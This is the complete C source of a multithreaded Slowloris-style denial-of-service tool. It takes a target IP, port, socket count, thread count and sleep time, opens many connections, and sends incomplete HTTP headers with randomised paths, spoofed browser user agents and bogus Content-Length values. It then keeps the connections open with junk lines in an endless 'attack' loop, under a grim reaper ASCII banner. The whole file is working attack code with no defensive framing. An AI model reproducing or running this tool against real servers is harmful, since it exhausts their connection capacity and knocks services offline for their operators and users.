#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define RND (65 + (rand() % 26))

const char grim_reaper[] =
"                                                                                                                                            \n"
"                                                         #%%#  #%&(                                                                         \n"
"                                                    %(&( ,  (#%%%(*(#%&&%( %                                                                \n"
"                                                %*#*%%&&&&&&&&&&&(%&&%##. %%#(%.#                                                           \n"
"                                             #,#&&&#                    #&%%.    (% (                                                       \n"
"                                          %#&&&                             %&&#   (* %,                                                    \n"
"                                        %&&                                    (&%#  (  #&#                                                 \n"
"                                      %&                      %#( #               %% *     %*#                                              \n"
"                                                          #(%&&##%&%(%               % %   .(%(%                                            \n"
"                                                       ((&%&%&&&%(%#(&&#               %(%###% %&&                                          \n"
"                                                     ##&&&%&%%&&&##%%(#&&(     (         %&( #%%% %%*(                                      \n"
"                                                    *%&&%&&&&&&&&&%(&&&#%&(                *  (&#*#                                         \n"
"                                                  #&    %&&&&& %%%&*%&&&%%%*                   % (&%                                        \n"
"                                                       (*&&, .%%%((%*  .%%&%(                 **(&#                                         \n"
"                                                        #&&%%%#%( #( ##( &&% *               (%&(                                           \n"
"                                                        #&&( &%   .,*#%&,&&&&%#(  %           #%                                            \n"
"                                                        #&&&&&#&%%%#(%%%%%%&#(,             *#&                                             \n"
"                                                       #%%%&&%(*(( &#**#%&&@&%%%&(#.,#     *##                                              \n"
"                                                  ##%&&&&&&#&&%%#*  * #%%%%,&&#*( ( (    (*%#                                               \n"
"                                               (&&&&&&&&&&&&& %( ,**((#%% #&&&%&&&&&*(*  ,%%                                                \n"
"                                              %&&&&&#&&&&&&&&*   #(* ,**,&&&&&%&&&&&&%, * %                                                 \n"
"                                               %&&&%&%&&&%&###* (*,##  *# #&&&%&%%#%%(  ( %%                                                \n"
"                                               (&&&%&&&&((&&%*(( *#%#( #%(%%(%#&%%&%((   *% #                                               \n"
"                                                %&&%&&& (#(%%,(#% .#&&(&%#% %&& &&&&( (  *%                                                 \n"
"                                                 &&& %%#%%&%&& #&&%%#&&&&&%&#&%%&&%#*(#  (&                                                 \n"
"                                                 &&& ((,%# (&&&%&&(,&&&&#&&&&#(&#(#((( #%&&(%                                               \n"
"                                                 && %&&&%#&#% &% %&&&%(&&%&&&#&&#&((** #*##%(%                                              \n"
"                                                #&&,&%%* &(&&&(&&%(#%%&&&%&&%%&%&&&%##%%*##&%                                               \n"
"                                               (&&%&&&( &&&&&&&%%%&&%%%&&&&#%&&&&&& #&&&&%(                                                 \n"
"                                               %&%%&&&&&#&%&&&&&%%#(#&&&&&#&&#%&%&(%(&&%%(&                                                 \n"
"                                             (&&&##&&&&&&&&&%&&&&&%&&&&&& &#&%%#(%&%%%##& &                                                 \n"
"                                             &&&&%&&&&%&&&&&%&#&&&&&&&&(#&%%&%##%%#%%(%%&(&&(                                               \n"
"                                            %%##&&(%&&&& &&&&&(%&%( #%&&&%&&&&&%&&&&%%&&&(&&&#                                              \n"
"                                            &  %&&&(&%&&&&&(&&*%&&&&&&&&&%&&&&&%#&&&#%&&& &&#&%,##(                                         \n"
"                                                &%&&%#%%&&&%%&%(##(*&%#((*#(&&&&%&&&%*&&& %&&(&% *                                          \n"
"                                               %&&&&#%%#%%%%%%%&&&*%&&& &&%#&&&%&&&#&,&&&#*%&&&&( ((                                        \n"
"                                               #&&%&&&&&&&&&&&&&&&&&&&&&&#&*&&&%%(&#&%&&&%#&&&(&*(.*((                                      \n"
"                                               #&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&&&#&&%%&*&.#%&&%%%%(* * #(                                    \n"
"                                                 & (((&%&&&&&&&&&%%&&% %&&&&&&&&(&&& &#%&&&%%###(, ((                                       \n"
"                                                              %&&& #&%&&&&&&&&&&*&&&(#&%& &%##(#,,,*                                        \n"
"                                                              .*%  #&&&&&#&&&&&%%&&&%%&&&*&%%%%##(*((                                       \n"
"                                                                #        (#%# &&&&&&&&&&&((%&&(  *(###                                      \n"
"                                                                           , ,    #&  &&(%%&&&(,                                            \n"
"                                                                                  ##     (&&&&.*,                                           \n"
"                                                                                  (#       (&&&.,%                                          \n"
"                                                                                           (&%(                                             \n"
"                                                                                                                                            \n";


const char *user_agents[] = {
	"Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13",
	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528+ (KHTML, like Gecko) Version/4.0 Safari/528.16"
};

struct ARGS {
	int i;
	int n_sockets;
	int **sockets;
	struct sockaddr_in remote;
};

static void sigint_handler(int sig)
{
	static char msg[] = "See You Space Cowboy...\n";

	write(STDOUT_FILENO, msg, sizeof(msg));

	exit(0);
}

void sendPayload(int sock)
{
	char buffer[256] = { 0 };
	srand(time(NULL));

	sprintf(buffer, "GET /%c%c%c%c HTTP/1.1\r\n", RND, RND, RND, RND);
	send(sock, buffer, strlen(buffer), 0);
	sprintf(buffer, "HOST: \r\n");
	send(sock, buffer, strlen(buffer), 0);
	sprintf(buffer, "User-Agent: %s\r\n", user_agents[RND &
			(sizeof(user_agents)/sizeof(char *) - 1)]);
	send(sock, buffer, strlen(buffer), 0);
	sprintf(buffer, "Content-Length: %d\r\n", RND);
	send(sock, buffer, strlen(buffer), 0);
}

void *spam(void *args)
{
	int j = 0;
	char buffer[8] = { 0 };
	struct ARGS *ptr = (struct ARGS *) args;

	srand(time(NULL));

	for (j = 0; j < ptr->n_sockets; ++j) {
		sprintf(buffer, "%c%c%c%c\r\n", RND, RND, RND, RND);
		if ((send(ptr->sockets[ptr->i][j], buffer,
						strlen(buffer), 0) == -1)) {
			ptr->sockets[ptr->i][j] = socket(AF_INET, SOCK_STREAM, 0);
			if (connect(ptr->sockets[ptr->i][j],
					(struct sockaddr *) &(ptr->remote),
					sizeof(ptr->remote)) < 0) {
				fprintf(stderr, "[!!] can not create socket %d\n",
						ptr->sockets[ptr->i][j]);
						continue;
			}
			sendPayload(ptr->sockets[ptr->i][j]);
		}
	}

	return NULL;
}

int main(int argc, char *argv[])
{
	if (argc != 6) {
		printf("%s\n\n\n", grim_reaper);
		printf("%s IP PORT SOCKETS THREADS SLEEP_TIME\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	signal(SIGINT, sigint_handler);

       	int i = 0, j = 0, launch = 1;
	int n_sockets = strtol(argv[3], NULL, 10);
	int n_threads = strtol(argv[4], NULL, 10);
	int tempo = strtol(argv[5], NULL, 10);
	char ip_str[INET_ADDRSTRLEN];
	struct ARGS args;
	struct addrinfo hints, *res, *p;
	pthread_t *threads = (pthread_t *) malloc(n_threads * sizeof(pthread_t));

	if (!threads) {
		fprintf(stderr, "[!!] problem in memory allocation\nExiting...\n");
		return EXIT_FAILURE;
	}

	printf("%s\n", grim_reaper);

	memset(&args, 0, sizeof(struct ARGS));
	memset(&hints, 0, sizeof(struct addrinfo));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	args.remote.sin_family = AF_INET;
	args.remote.sin_port = htons(strtol(argv[2], NULL, 10));

	if ((getaddrinfo(argv[1], NULL, &hints, &res)) == 0) {
		for (p = res; p != NULL; p = p->ai_next) {
			if (p->ai_family == AF_INET) {
				struct sockaddr_in *aux =
					(struct sockaddr_in *) p->ai_addr;
				memcpy(&args.remote.sin_addr.s_addr,
						&(aux->sin_addr),
						sizeof(unsigned int));
			}
		}
	} else {
		inet_pton(AF_INET, argv[1],
				(void *) (&args.remote.sin_addr.s_addr));
	}

	inet_ntop(AF_INET, (void *) &args.remote.sin_addr.s_addr, ip_str,
			sizeof(ip_str));

	freeaddrinfo(p);
	freeaddrinfo(res);

	printf("[i] attacking address: %s\n", ip_str);

	int **sockets = (int **) malloc(n_threads * sizeof(int *));

	if (sockets == NULL) {
		printf("[!!] problem in memory allocation\nExiting...\n");
		return EXIT_FAILURE;
	}

	for (i = 0; i < n_threads; ++i) {
		sockets[i] = (int *) malloc((n_sockets + 1) * sizeof(int));

		if (sockets[i] == NULL) {
			printf("[!!] problem in memory allocation\nExiting...\n");
			return EXIT_FAILURE;
		}

		for (j = 0; j < n_sockets; ++j) {
			sockets[i][j] = socket(AF_INET, SOCK_STREAM, 0);

			if (sockets[i][j] == -1) {
				printf("[!!] can not create socket %d from thread (%d).\n",
						j + 1, i + 1);
				break;
			}
			printf("[i] created socket %d from thread (%d).\n",
					j + 1, i + 1);
			if ((connect(sockets[i][j],
					(struct sockaddr *) &args.remote,
					sizeof(args.remote)) < 0)) {
				printf("[!!] can not create socket %d for thread (%d).\n",
						j + 1, i + 1);
				break;
			}
			sendPayload(sockets[i][j]);
		}
		sockets[i][j] = -1;
	}

	args.sockets = sockets;
	args.n_sockets = n_sockets;

	while (1) {
		printf("[i] restarting attack\n");

		for (i = 0; i < n_threads; ++i) {
			args.i = i;
			printf("[i] maintaining sockets on thread (%d) open..\n", i + 1);
			pthread_create(&threads[i], NULL, &spam, &args);
		}

		for (i = 0; i < n_threads; ++i) {
			pthread_join(threads[i], NULL);
			printf("[i] attacks on thread (%d) will be paused.\n", i + 1);
		}

		printf("[i] launched number %d completed.\n", launch++);
		printf("[i] sleeping for %02d seconds.\n", tempo);

		sleep(tempo);
	}

	for (i = 0; i < n_threads; ++i)
		free(sockets[i]);


	free(sockets);
	free(threads);

	return 0;
}